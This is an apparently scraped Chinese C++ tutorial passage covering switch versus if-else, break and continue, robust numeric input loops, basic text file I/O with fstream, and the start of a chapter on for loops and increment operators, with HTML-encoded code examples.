当分支逻辑清晰，可以提高可读性时。 何时使用 if else if else: 当判断条件涉及范围（例如 age &gt; 18 &amp;&amp; age &lt; 60）时。 当判断条件涉及浮点数或字符串比较时。 当判断条件比较复杂，涉及多个不同变量或逻辑运算时。 当只有一个或两个分支时，if else 可能更简洁。 示例比较: 123456789101112131415161718192021222324252627// 使用 if else ifint num = 2;if (num == 1) &#123; std::cout &lt;&lt; &quot;One&quot; &lt;&lt; std::endl;&#125; else if (num == 2) &#123; std::cout &lt;&lt; &quot;Two&quot; &lt;&lt; std::endl; // 执行&#125; else if (num == 3) &#123; std::cout &lt;&lt; &quot;Three&quot; &lt;&lt; std::endl;&#125; else &#123; std::cout &lt;&lt; &quot;Other&quot; &lt;&lt; std::endl;&#125;// 使用 switch (等效)switch (num) &#123; case 1: std::cout &lt;&lt; &quot;One&quot; &lt;&lt; std::endl; break; case 2: std::cout &lt;&lt; &quot;Two&quot; &lt;&lt; std::endl; // 执行 break; case 3: std::cout &lt;&lt; &quot;Three&quot; &lt;&lt; std::endl; break; default: std::cout &lt;&lt; &quot;Other&quot; &lt;&lt; std::endl; break;&#125; 对于这种基于单个整数值的多路分支，switch 通常被认为更清晰、有时效率也可能更高（编译器可能将其优化为跳转表）。但对于涉及范围或非整数类型的判断，则必须使用 if else if 结构。 6.6 break 和 continue 语句C++ 提供了两个特殊的语句，break 和 continue，用于在循环（for, while, do while）或 switch 语句内部改变正常的执行流程。 6.6.1 break 语句break 语句用于立即终止包含它的最内层的循环（for, while, do while）或 switch 语句的执行。程序控制流会跳转到该循环或 switch 语句之后的下一条语句。 用法: 在循环中: 当满足某个特定条件时，提前退出循环。 在 switch 语句中: 防止“贯穿”（fall-through）到下一个 case，在执行完匹配的 case 代码块后跳出 switch 结构（如 6.5 节所述）。 示例 (在循环中使用): 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int main() &#123; // 查找数组中第一个负数的位置 int numbers[] = &#123;10, 5, 0, -2, 8, -5&#125;; int found_index = -1; // 初始化为 -1，表示未找到 std::cout &lt;&lt; &quot;Searching for the first negative number...&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 6; ++i) &#123; std::cout &lt;&lt; &quot;Checking index &quot; &lt;&lt; i &lt;&lt; &quot;, value: &quot; &lt;&lt; numbers[i] &lt;&lt; std::endl; if (numbers[i] &lt; 0) &#123; found_index = i; std::cout &lt;&lt; &quot;Negative number found at index &quot; &lt;&lt; i &lt;&lt; &quot;. Breaking loop.&quot; &lt;&lt; std::endl; break; // 找到第一个负数，立即跳出 for 循环 &#125; &#125; if (found_index != -1) &#123; std::cout &lt;&lt; &quot;The loop was terminated early.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No negative number found in the array.&quot; &lt;&lt; std::endl; &#125; // 演示在嵌套循环中的作用 std::cout &lt;&lt; &quot;\\nNested loop example:&quot; &lt;&lt; std::endl; for (int i = 1; i &lt;= 3; ++i) &#123; for (int j = 1; j &lt;= 3; ++j) &#123; if (i == 2 &amp;&amp; j == 2) &#123; std::cout &lt;&lt; &quot;Breaking inner loop at i=&quot; &lt;&lt; i &lt;&lt; &quot;, j=&quot; &lt;&lt; j &lt;&lt; std::endl; break; // 只跳出内层循环 (j 循环) &#125; std::cout &lt;&lt; &quot;i=&quot; &lt;&lt; i &lt;&lt; &quot;, j=&quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // break 后，控制流会到达这里，继续外层循环的下一次迭代 std::cout &lt;&lt; &quot;End of inner loop for i=&quot; &lt;&lt; i &lt;&lt; std::endl; &#125; return 0;&#125; 代码解释: 第一个循环遍历 numbers 数组。当 i 为 3 时，numbers[3] 是 -2，满足 if 条件。found_index 被设为 3，打印消息，然后 break 语句被执行，立即终止 for 循环。后面的元素（8 和 -5）不会被检查。 在嵌套循环示例中，当 i 为 2 且 j 为 2 时，break 语句执行。它只终止了最内层的 j 循环。外层的 i 循环继续执行其下一次迭代（当 i 为 3 时）。 6.6.2 continue 语句continue 语句用于跳过当前循环迭代中剩余的代码，并立即开始下一次迭代。与 break 不同，continue 不会终止整个循环。 用法: 在 while 和 do while 循环中: 控制流跳转到循环条件的判断处。 在 for 循环中: 控制流首先跳转到 for 循环的更新表达式（例如 ++i），然后跳转到循环条件的判断处。 示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; // 打印 1 到 10 之间的奇数 std::cout &lt;&lt; &quot;Odd numbers between 1 and 10:&quot; &lt;&lt; std::endl; for (int i = 1; i &lt;= 10; ++i) &#123; if (i % 2 == 0) &#123; // 如果 i 是偶数 continue; // 跳过本次迭代剩余的部分 (cout 语句)，直接进行下一次迭代 (i++) &#125; // 只有当 i 是奇数时，才会执行这行代码 std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出: 1 3 5 7 9 // 演示在 while 循环中 std::cout &lt;&lt; &quot;\\nSkipping number 5 in while loop (1 to 7):&quot; &lt;&lt; std::endl; int k = 0; while (k &lt; 7) &#123; k++; // 先递增 k if (k == 5) &#123; std::cout &lt;&lt; &quot;(Skipping 5) &quot;; continue; // 跳过本次迭代的 cout &#125; std::cout &lt;&lt; k &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出: 1 2 3 4 (Skipping 5) 6 7 return 0;&#125; 代码解释: 在 for 循环中，当 i 是偶数时（i % 2 == 0 为真），continue 语句执行。它跳过了 std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; 这行代码，直接执行更新表达式 ++i，然后判断循环条件 i &lt;= 10。因此，只有奇数被打印出来。 在 while 循环中，当 k 递增到 5 时，if 条件满足，continue 执行，跳过了 std::cout &lt;&lt; k &lt;&lt; &quot; &quot;;，直接回到 while (k &lt; 7) 的条件判断。 总结 break: 完全终止最内层的循环或 switch。 continue: 跳过当前循环迭代的剩余部分，进入下一次迭代（如果循环条件允许）。 这两个语句可以使循环控制更加灵活，但过度使用可能会降低代码的可读性。通常，可以通过调整循环条件或使用 if 语句来避免一些不必要的 break 或 continue。 6.7 读取数字的循环在 C++ 程序中，经常需要编写循环来读取用户的数字输入，直到满足某个条件（例如输入特定值或遇到无效输入）为止。然而，处理数字输入，特别是处理潜在的错误输入，需要一些技巧。 基本的数字读取循环一个简单的读取数字并累加的循环可能如下所示： 123456789101112131415161718192021#include &lt;iostream&gt;int main() &#123; int sum = 0; int input_number; std::cout &lt;&lt; &quot;Enter numbers to sum (enter a non-number to quit): &quot;; // 尝试读取一个整数，如果成功，cin 返回 true while (std::cin &gt;&gt; input_number) &#123; sum += input_number; std::cout &lt;&lt; &quot;Current sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Enter next number: &quot;; &#125; // 当输入非数字时，循环结束 std::cout &lt;&lt; &quot;\\nLoop terminated.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Final sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; 工作方式: std::cin &gt;&gt; input_number 尝试从输入流中读取一个整数并存储到 input_number 中。 这个表达式本身会返回 std::cin 对象。在需要布尔值的上下文中（如 while 的条件），std::cin 对象会根据流的状态转换为 true 或 false。 如果成功读取一个整数，流状态是正常的，std::cin 转换为 true，循环体执行。 如果用户输入了非数字（例如输入 “hello” 或按 Ctrl+Z/Ctrl+D 表示文件结束），std::cin &gt;&gt; input_number 会失败。此时，std::cin 会进入“失败”（fail）状态，转换为 false，循环终止。 处理错误输入上面的简单循环在遇到非数字输入时会终止，但它没有明确地处理错误状态。如果循环结束后还需要继续从 std::cin 读取其他类型的输入，就需要清除错误状态并丢弃无效的输入。 问题: 当 std::cin &gt;&gt; input_number 失败时，输入流 std::cin 会设置一个错误标志（failbit），并且导致失败的输入（例如 “hello”）仍然留在输入缓冲区中。如果不处理，后续的 std::cin 操作通常也会立即失败。 解决方案: 清除错误状态: 使用 std::cin.clear() 方法重置流的错误标志。 忽略无效输入: 使用 std::cin.ignore() 方法丢弃输入缓冲区中不需要的字符。通常会忽略直到下一个换行符 \\n 或达到某个最大字符数。 示例 (更健壮的数字读取循环): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;limits&gt; // 需要包含 &lt;limits&gt; 来使用 numeric_limitsint main() &#123; int sum = 0; int input_number; std::cout &lt;&lt; &quot;Enter numbers to sum (enter a non-number to quit): &quot;; while (true) &#123; // 使用无限循环，内部处理退出条件 std::cout &lt;&lt; &quot;Enter a number: &quot;; if (std::cin &gt;&gt; input_number) &#123; // 成功读取数字 sum += input_number; std::cout &lt;&lt; &quot;Current sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; &#125; else &#123; // 读取失败 (输入了非数字或 EOF) std::cout &lt;&lt; &quot;Invalid input detected or EOF reached.&quot; &lt;&lt; std::endl; // 检查是否是文件结束符 (EOF) if (std::cin.eof()) &#123; std::cout &lt;&lt; &quot;End of file reached. Exiting.&quot; &lt;&lt; std::endl; break; // 如果是 EOF，直接退出循环 &#125; // 清除错误标志，使 cin 恢复正常 std::cout &lt;&lt; &quot;Clearing error state...&quot; &lt;&lt; std::endl; std::cin.clear(); // 丢弃缓冲区中导致错误的无效输入，直到换行符 std::cout &lt;&lt; &quot;Discarding invalid input...&quot; &lt;&lt; std::endl; std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Please try entering a number again, or press Ctrl+Z/Ctrl+D to exit.&quot; &lt;&lt; std::endl; // 注意：在这个版本中，遇到非数字输入后，我们提示用户重试或退出， // 而不是像第一个例子那样直接终止求和。 // 如果希望遇到非数字就退出，可以在 else 块的末尾加上 break; // break; // 取消注释此行，则遇到非数字输入时退出循环 &#125; &#125; std::cout &lt;&lt; &quot;\\nLoop finished.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Final sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 可以在这里尝试读取其他输入，因为错误状态已被清除 std::string remaining_input; std::cout &lt;&lt; &quot;\\nEnter some text: &quot;; // 需要先忽略掉上次输入留下的换行符（如果存在） if (std::cin.peek() == &#x27;\\n&#x27;) &#123; std::cin.ignore(); &#125; std::getline(std::cin, remaining_input); std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; remaining_input &lt;&lt; std::endl; return 0;&#125; 代码解释: 使用 while(true) 创建一个看似无限的循环，退出逻辑放在循环内部。 if (std::cin &gt;&gt; input_number) 尝试读取数字。 如果成功，执行加法。 如果失败 (else 块)： 打印错误消息。 检查是否是文件结束符 (std::cin.eof())，如果是则 break。 调用 std::cin.clear() 清除 failbit 等错误状态。 调用 std::cin.ignore(...) 来丢弃缓冲区中的无效输入。std::numeric_limits&lt;std::streamsize&gt;::max() 表示忽略尽可能多的字符，直到遇到换行符 \\n。这确保了下一次循环迭代时，std::cin 不会再次读取相同的无效输入。 根据需要，可以选择 break 退出，或者让循环继续，提示用户重新输入。 这种模式在需要从用户那里可靠地读取数字输入时非常有用，因为它能优雅地处理输入错误，而不是让程序因为意外的输入而崩溃或行为异常。 6.8 简单文件输入/输出到目前为止，我们主要使用 cin 从键盘读取输入，用 cout 向屏幕显示输出。C++ 还提供了强大的功能，可以让我们将数据写入文件或从文件中读取数据。这对于存储程序运行结果、读取配置文件或处理大量数据至关重要。本节将介绍基本的文本文件输入/输出（I/O）操作。 6.8.1 文本 I/O 和文本文件文件 I/O 主要有两种模式：文本模式和二进制模式。 文本文件 (Text File): 文本文件存储的是人类可读的字符序列。文件中的数据被解释为字符，数字（如 123）会被存储为字符序列（&#39;1&#39;, &#39;2&#39;, &#39;3&#39;）。在不同的操作系统上，文本文件对行尾的处理可能不同（例如，Windows 使用回车+换行 \\r\\n，Unix/Linux 使用换行 \\n）。C++ 的文本 I/O 会自动处理这些行尾转换，使得代码更具可移植性。我们通常使用 &lt;&lt; 和 &gt;&gt; 或 getline 等函数来处理文本文件。 二进制文件 (Binary File): 二进制文件存储的是数据的原始字节表示。数字 123 会被存储为其在内存中的二进制形式（例如，一个 4 字节的 int）。二进制 I/O 不进行任何字符转换或行尾处理，读写速度通常更快，文件也可能更小，但内容通常不是人类直接可读的。处理二进制文件通常使用 read() 和 write() 成员函数。 本节重点介绍文本文件的 I/O 操作。 6.8.2 写入到文本文件中要将数据写入文本文件，我们需要使用 C++ 的文件流库 &lt;fstream&gt;。 步骤: 包含头文件: #include &lt;fstream&gt; 创建 ofstream 对象: ofstream 类（output file stream）用于向文件写入数据。你需要创建一个该类的对象，并在创建时或之后将其与一个文件名关联起来。 1234std::ofstream outputFile; // 创建 ofstream 对象outputFile.open(&quot;mydata.txt&quot;); // 将对象与文件关联（如果文件不存在则创建，如果存在则清空内容）// 或者在创建时直接关联// std::ofstream outputFile(&quot;mydata.txt&quot;); 检查文件是否成功打开: 在尝试写入之前，最好检查文件是否成功打开。可以使用 is_open() 方法或直接检查流对象的状态。 1234if (!outputFile.is_open()) &#123; // 或者 if (!outputFile) std::cerr &lt;&lt; &quot;Error opening file for writing!&quot; &lt;&lt; std::endl; return 1; // 或者进行其他错误处理&#125; 写入数据: 使用与 cout 类似的 &lt;&lt; 运算符将数据写入文件流。 123456int year = 2024;double price = 99.99;std::string item = &quot;Gadget&quot;;outputFile &lt;&lt; &quot;Item: &quot; &lt;&lt; item &lt;&lt; std::endl;outputFile &lt;&lt; &quot;Year: &quot; &lt;&lt; year &lt;&lt; std::endl;outputFile &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; 关闭文件: 完成写入后，应该关闭文件以确保所有数据都被刷新（写入）到磁盘，并释放文件资源。可以显式调用 close() 方法，或者当 ofstream 对象离开其作用域时（例如函数结束），其析构函数会自动关闭文件。 1outputFile.close(); // 显式关闭 示例代码: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;fstream&gt; // 包含文件流头文件#include &lt;string&gt;int main() &#123; // 1. 创建 ofstream 对象并关联文件 std::ofstream outFile(&quot;report.txt&quot;); // 尝试打开/创建 report.txt // 2. 检查文件是否成功打开 if (!outFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not open report.txt for writing.&quot; &lt;&lt; std::endl; return 1; // 返回错误码 &#125; // 3. 写入数据 std::cout &lt;&lt; &quot;Writing data to report.txt...&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;--- Sales Report ---&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Product: Laptop&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Quantity: 15&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Revenue: &quot; &lt;&lt; 15 * 1200.50 &lt;&lt; std::endl; outFile &lt;&lt; &quot;--------------------&quot; &lt;&lt; std::endl; // 4. 关闭文件 (虽然析构函数会自动关闭，但显式关闭是好习惯) outFile.close(); std::cout &lt;&lt; &quot;Data written successfully.&quot; &lt;&lt; std::endl; return 0;&#125; 运行此程序后，将在程序所在的目录下创建一个名为 report.txt 的文件（如果不存在），其内容如下： 12345--- Sales Report ---Product: LaptopQuantity: 15Revenue: 18007.5-------------------- 6.8.3 读取文本文件从文本文件读取数据与写入类似，但使用 ifstream 类（input file stream）。 步骤: 包含头文件: #include &lt;fstream&gt; 创建 ifstream 对象: 创建一个 ifstream 对象并将其与要读取的文件名关联。 1234std::ifstream inputFile; // 创建 ifstream 对象inputFile.open(&quot;mydata.txt&quot;); // 将对象与文件关联以供读取// 或者在创建时直接关联// std::ifstream inputFile(&quot;mydata.txt&quot;); 检查文件是否成功打开: 同样，检查文件是否成功打开至关重要。如果文件不存在或无法访问，打开操作会失败。 1234if (!inputFile.is_open()) &#123; // 或者 if (!inputFile) std::cerr &lt;&lt; &quot;Error opening file for reading!&quot; &lt;&lt; std::endl; return 1;&#125; 读取数据: 可以使用与 cin 类似的 &gt;&gt; 运算符来读取由空格分隔的数据，或者使用 std::getline() 来读取整行。读取操作通常放在循环中，直到到达文件末尾。 使用 &gt;&gt; 读取: 它会跳过前导空白（空格、制表符、换行符），然后读取直到遇到下一个空白字符。 使用 std::getline(inputFile, lineString) 读取: 它会读取整行（包括空格），直到遇到换行符 \\n 为止（换行符本身会被读取并丢弃）。 检查文件末尾 (EOF): 当尝试读取但已无数据可读时（到达文件末尾），输入流会进入特殊状态。循环通常依赖于检查流的状态来终止。 while (inputFile &gt;&gt; variable): 当 &gt;&gt; 成功读取时，流状态为 true，循环继续；到达文件末尾或遇到无效数据时，状态变为 false，循环终止。 while (std::getline(inputFile, lineString)): 当 getline 成功读取一行时，流状态为 true；到达文件末尾时，状态变为 false。 关闭文件: 读取完成后，关闭文件。同样，可以显式调用 close()，或者依赖对象的析构函数。 1inputFile.close(); 示例代码 (读取 report.txt): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;#include &lt;vector&gt; // 用于存储读取的行int main() &#123; // 1. 创建 ifstream 对象并关联文件 std::ifstream inFile(&quot;report.txt&quot;); // 2. 检查文件是否成功打开 if (!inFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not open report.txt for reading.&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;Reading data from report.txt using getline:&quot; &lt;&lt; std::endl; std::string line; std::vector&lt;std::string&gt; lines; // 3. 使用 getline 逐行读取 while (std::getline(inFile, line)) &#123; std::cout &lt;&lt; &quot;Read line: &quot; &lt;&lt; line &lt;&lt; std::endl; lines.push_back(line); // 将读取的行存入 vector &#125; // 检查循环是因为到达文件末尾还是发生错误 if (inFile.eof()) &#123; std::cout &lt;&lt; &quot;\\nReached end of file.&quot; &lt;&lt; std::endl; &#125; else if (inFile.fail()) &#123; std::cerr &lt;&lt; &quot;\\nError reading file (not EOF).&quot; &lt;&lt; std::endl; &#125; // 4. 关闭文件 inFile.close(); std::cout &lt;&lt; &quot;\\n--- Stored Lines ---&quot; &lt;&lt; std::endl; for(const std::string&amp; stored_line : lines) &#123; std::cout &lt;&lt; stored_line &lt;&lt; std::endl; &#125; // 示例：使用 &gt;&gt; 读取特定类型的数据 (假设文件格式已知) std::ifstream dataFile(&quot;report.txt&quot;); // 重新打开文件 if (!dataFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not reopen report.txt&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;\\nReading specific data using &gt;&gt; (may be fragile):&quot; &lt;&lt; std::endl; std::string header, productLabel, productName, qtyLabel; int quantity; double revenue; // 跳过第一行 std::getline(dataFile, header); // 读取第二行的数据 dataFile &gt;&gt; productLabel &gt;&gt; productName; // 读取第三行的数据 dataFile &gt;&gt; qtyLabel &gt;&gt; quantity; // 跳过第四行的 Revenue: 标签 std::string revenueLabel; dataFile &gt;&gt; revenueLabel &gt;&gt; revenue; if (dataFile) &#123; // 检查读取是否成功 std::cout &lt;&lt; &quot;Product: &quot; &lt;&lt; productName &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Quantity: &quot; &lt;&lt; quantity &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Revenue: &quot; &lt;&lt; revenue &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to parse data using &gt;&gt;&quot; &lt;&lt; std::endl; &#125; dataFile.close(); return 0;&#125; 代码解释: 第一个循环使用 std::getline() 读取文件的每一行，并将其打印出来，同时存储在 lines 向量中。while (std::getline(inFile, line)) 是读取文本文件的常用模式。 循环结束后，通过检查 inFile.eof() 和 inFile.fail() 可以判断循环是正常结束（到达文件末尾）还是因为其他错误。 第二个示例演示了使用 &gt;&gt; 操作符读取特定格式的数据。这种方法对于格式严格固定的文件可能有效，但如果文件格式稍有变化（例如多了空格），&gt;&gt; 就可能读取失败或读到错误的数据，因此通常不如 getline 健壮。需要仔细处理标签和数据类型。 文件 I/O 是 C++ 编程中非常重要的部分，它使得程序能够持久化数据，并与其他程序或系统进行交互。 6.9 总结本章介绍了 C++ 中用于控制程序流程的各种分支语句和相关概念，使得程序能够根据不同的条件执行不同的代码路径。 主要内容回顾： if 语句系列: if 语句：根据条件是否为真来决定是否执行某段代码。 if else 语句：提供两个代码路径，根据条件为真或假选择其一执行。 if else if else 结构：用于处理多个互斥的条件，提供多路分支选择。 逻辑运算符: || (逻辑或)：两个操作数中至少一个为真时，结果为真。 &amp;&amp; (逻辑与)：两个操作数都为真时，结果才为真。具有短路求值特性。 ! (逻辑非)：反转操作数的逻辑状态（真变假，假变真）。 cctype 库: 提供了一系列用于处理字符的函数，如 isalpha(), isdigit(), isspace(), ispunct(), toupper(), tolower() 等，方便进行字符分类和转换。 三元运算符 (?:): 提供了一种简洁的方式来根据条件选择两个值中的一个，是 if else 语句的一种紧凑替代形式，常用于简单的赋值操作。 语法：condition ? expression1 : expression2; switch 语句: 根据一个整数表达式的值，从多个 case 标签中选择一个匹配的执行点。 通常与 break 语句配合使用，以防止“贯穿”到下一个 case。 default 标签处理所有其他不匹配的情况。 case 标签必须是常量表达式。 适用于基于单个离散整数值的多路分支。 break 和 continue 语句: break：立即终止最内层的循环（for, while, do while）或 switch 语句。 continue：跳过当前循环迭代的剩余部分，直接开始下一次迭代（更新和条件检查）。 读取数字的循环: 演示了如何使用循环（如 while (cin &gt;&gt; value)）来连续读取数字输入。 强调了处理错误输入的重要性，包括使用 cin.clear() 清除错误状态和 cin.ignore() 丢弃无效输入，以编写更健壮的输入代码。 简单文件输入/输出: 引入了 &lt;fstream&gt; 库，用于文件操作。 ofstream：用于向文件写入数据（输出文件流），使用 &lt;&lt; 操作符。 ifstream：用于从文件读取数据（输入文件流），使用 &gt;&gt; 或 getline()。 强调了文件打开检查 (is_open()) 和关闭文件 (close() 或利用对象析构) 的重要性。 区分了文本 I/O 和二进制 I/O 的基本概念。 通过掌握这些分支结构和控制语句，可以编写出能够响应不同情况、处理用户输入和文件数据的更复杂、更灵活的 C++ 程序。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 5 循环和关系表达式","slug":"Cpp_tutorial_Chapter_5","date":"2025-04-26T12:03:35.373Z","updated":"2025-04-26T12:01:40.288Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_5/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_5/","excerpt":"","text":"5.1 for循环循环是编程中的基本控制结构，它允许我们重复执行一段代码，直到满足某个条件为止。for 循环是 C++ 中最常用的循环结构之一，特别适用于已知循环次数或需要按特定步长迭代的情况。 5.1.1 for循环的组成部分for 循环的头部包含三个由分号 ; 分隔的部分，控制着循环的执行流程： 初始化 (Initialization): 在循环开始前执行一次。 通常用于声明和/或初始化循环控制变量（计数器）。 可以包含多条语句，用逗号分隔（见 5.1.11）。 也可以为空。 测试条件 (Test Condition / Condition): 在每次循环迭代开始前进行求值。 结果必须是一个布尔值 (true 或 false) 或可以转换为布尔值（非零为 true，零为 false）。 如果条件为 true，则执行循环体。 如果条件为 false，则循环终止，程序继续执行循环后面的语句。 也可以为空，空条件被视为 true，形成无限循环（需要其他方式跳出，如 break）。 更新 (Update / Increment / Decrement): 在每次循环迭代结束时（执行完循环体之后，下次测试条件之前）执行。 通常用于修改循环控制变量（例如，递增或递减计数器）。 可以包含多条语句，用逗号分隔。 也可以为空。 语法: 123456789for (initialization; test_condition; update) &#123; // 循环体 (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125; // 或者如果循环体只有一条语句，可以省略花括号for (initialization; test_condition; update) single_statement; 执行流程: 执行 initialization。 计算 test_condition。 如果 test_condition 为 false，跳出循环，执行循环后面的代码。 如果 test_condition 为 true，执行循环体中的语句。 执行 update。 回到步骤 2。 示例: 12345678910111213141516#include &lt;iostream&gt;int main() &#123; // 打印数字 0 到 4 for (int i = 0; // 1. 初始化: 声明并初始化计数器 i 为 0 i &lt; 5; // 2. 测试条件: 只要 i 小于 5 就继续 i = i + 1) // 4. 更新: 每次循环后将 i 增加 1 &#123; // 3. 循环体 std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Loop finished.&quot; &lt;&lt; std::endl; return 0;&#125; 5.1.2 回到for循环for 循环提供了一种非常结构化的方式来编写计数循环。上面的例子展示了一个典型的从 0 开始计数到某个值之前的循环。 基本计数循环示例: 12345678910111213141516171819#include &lt;iostream&gt;int main() &#123; // 计算 1 到 10 的和 int sum = 0; for (int i = 1; i &lt;= 10; i = i + 1) &#123; // 从 1 开始，包含 10 sum = sum + i; &#125; std::cout &lt;&lt; &quot;Sum of 1 to 10 is: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出 55 // 倒序打印 5 到 1 std::cout &lt;&lt; &quot;Countdown:&quot; &lt;&lt; std::endl; for (int count = 5; count &gt; 0; count = count - 1) &#123; std::cout &lt;&lt; count &lt;&lt; &quot;...&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Liftoff!&quot; &lt;&lt; std::endl; return 0;&#125; 5.1.3 修改步长for 循环的更新部分不一定总是加 1 或减 1。你可以根据需要指定任何有效的更新表达式。 示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; // 以步长 2 递增，打印偶数 std::cout &lt;&lt; &quot;Even numbers less than 10:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 10; i = i + 2) &#123; std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出 0 2 4 6 8 // 以步长 5 递减 std::cout &lt;&lt; &quot;Counting down by 5s:&quot; &lt;&lt; std::endl; for (int n = 50; n &gt;= 0; n = n - 5) &#123; std::cout &lt;&lt; n &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出 50 45 40 35 30 25 20 15 10 5 0 // 使用乘法作为步长 (注意避免无限循环) std::cout &lt;&lt; &quot;Powers of 2 less than 100:&quot; &lt;&lt; std::endl; for (int p = 1; p &lt; 100; p = p * 2) &#123; std::cout &lt;&lt; p &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出 1 2 4 8 16 32 64 return 0;&#125; 5.1.4 使用for循环访问字符串for 循环是遍历字符串（无论是 C 风格字符串还是 std::string 对象）中每个字符的常用方法。 示例 (C 风格字符串): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strlen()int main() &#123; char message[] = &quot;Hello&quot;; int len = strlen(message); // 获取字符串长度 (不包括 \\0) std::cout &lt;&lt; &quot;Characters in \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; len; i = i + 1) &#123; // 索引从 0 到 len-1 std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; message[i] &lt;&lt; std::endl; &#125; // 也可以使用指针和空字符判断 std::cout &lt;&lt; &quot;Characters using pointer:&quot; &lt;&lt; std::endl; for (char *p = message; *p != &#x27;\\0&#x27;; p = p + 1) &#123; std::cout &lt;&lt; *p &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 示例 (std::string): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string word = &quot;World&quot;; std::cout &lt;&lt; &quot;Characters in \\&quot;&quot; &lt;&lt; word &lt;&lt; &quot;\\&quot;:&quot; &lt;&lt; std::endl; // 使用 size() 获取长度，size_t 通常是合适的索引类型 for (size_t i = 0; i &lt; word.size(); i = i + 1) &#123; std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; word[i] &lt;&lt; std::endl; &#125; // C++11 基于范围的 for 循环 (更简洁，见 5.4) // std::cout &lt;&lt; &quot;Characters using range-based for:&quot; &lt;&lt; std::endl; // for (char ch : word) &#123; // std::cout &lt;&lt; ch &lt;&lt; &quot; &quot;; // &#125; // std::cout &lt;&lt; std::endl; return 0;&#125; 5.1.5 递增运算符（++）和递减运算符（–）C++ 提供了两个非常有用的运算符来简化变量加 1 或减 1 的操作： 递增运算符 (++): 将操作数的值增加 1。 递减运算符 (--): 将操作数的值减少 1。 它们可以用于整数类型、浮点类型和指针类型。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int count = 5; double value = 10.5; // 递增 count++; // 等价于 count = count + 1; 现在 count 是 6 ++value; // 等价于 value = value + 1; 现在 value 是 11.5 std::cout &lt;&lt; &quot;Count after increment: &quot; &lt;&lt; count &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value after increment: &quot; &lt;&lt; value &lt;&lt; std::endl; // 递减 count--; // 等价于 count = count - 1; 现在 count 是 5 --value; // 等价于 value = value - 1; 现在 value 是 10.5 std::cout &lt;&lt; &quot;Count after decrement: &quot; &lt;&lt; count &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value after decrement: &quot; &lt;&lt; value &lt;&lt; std::endl; // 在 for 循环中使用 std::cout &lt;&lt; &quot;Loop using ++:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 3; ++i) &#123; // 使用 ++i 或 i++ 效果相同 (作为独立语句) std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; std::endl; &#125; return 0;&#125; 5.1.6 副作用和顺序点副作用 (Side Effect): 指的是修改变量的值或执行 I/O 操作等改变程序状态的行为。递增 (++) 和递减 (--) 运算符都具有副作用，因为它们会修改操作数的值。 顺序点 